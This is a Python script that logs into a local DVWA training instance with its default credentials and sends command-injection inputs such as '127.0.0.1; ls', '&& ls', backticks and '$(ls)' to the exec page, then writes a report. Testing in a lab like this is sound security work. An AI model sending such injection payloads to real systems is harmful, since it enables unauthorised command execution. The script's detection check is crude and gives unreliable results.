import requests
from bs4 import BeautifulSoup

# DVWA setup details
DVWA_URL = 'http://localhost/dvwa/'
LOGIN_URL = DVWA_URL + 'login.php'
COMMAND_INJECTION_URL = DVWA_URL + 'vulnerabilities/exec/'

# Login credentials
USERNAME = 'admin'
PASSWORD = 'password'

# Test inputs
test_cases = [
    {"input": "127.0.0.1", "description": "Normal input"},
    {"input": "127.0.0.1; ls", "description": "Command injection via semicolon"},
    {"input": "127.0.0.1 && ls", "description": "Command injection via logical AND"},
    {"input": "127.0.0.1 || ls", "description": "Command injection via logical OR"},
    {"input": "`ls`", "description": "Command injection via backticks"},
    {"input": "$(ls)", "description": "Command injection via $()"}
]

# Start a session to maintain cookies
session = requests.Session()

def login():
    # Get the CSRF token
    response = session.get(LOGIN_URL)
    soup = BeautifulSoup(response.content, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'})['value']
    
    # Prepare login data
    login_data = {
        'username': USERNAME,
        'password': PASSWORD,
        'Login': 'Login',
        'user_token': user_token
    }
    
    # Perform login
    session.post(LOGIN_URL, data=login_data)

def test_command_injection():
    # Log in to DVWA
    login()
    
    report_lines = ["Command Injection Vulnerability Report\n", "-" * 40 + "\n"]
    
    for case in test_cases:
        # Get the CSRF token for the command injection page
        response = session.get(COMMAND_INJECTION_URL)
        soup = BeautifulSoup(response.content, 'html.parser')
        user_token = soup.find('input', {'name': 'user_token'})['value']
        
        # Prepare payload
        payload = {
            'ip': case['input'],
            'Submit': 'Submit',
            'user_token': user_token
        }
        
        # Send payload
        response = session.post(COMMAND_INJECTION_URL, data=payload)
        result = response.text
        
        # Check for signs of command injection
        if "uid=" in result or "bin" in result or "root" in result:
            vulnerability_detected = True
        else:
            vulnerability_detected = False
        
        # Log results
        report_lines.append(f"Test: {case['description']}\n")
        report_lines.append(f"Input: {case['input']}\n")
        report_lines.append(f"Output: {result}\n")
        if vulnerability_detected:
            report_lines.append(f"Vulnerability detected for input: {case['input']}\n")
        else:
            report_lines.append(f"No vulnerability detected for input: {case['input']}\n")
        report_lines.append("-" * 40 + "\n")
    
    # Write report to a file
    with open("dvwa_vulnerability_report.txt", "w") as report_file:
        report_file.writelines(report_lines)

if __name__ == "__main__":
    test_command_injection()
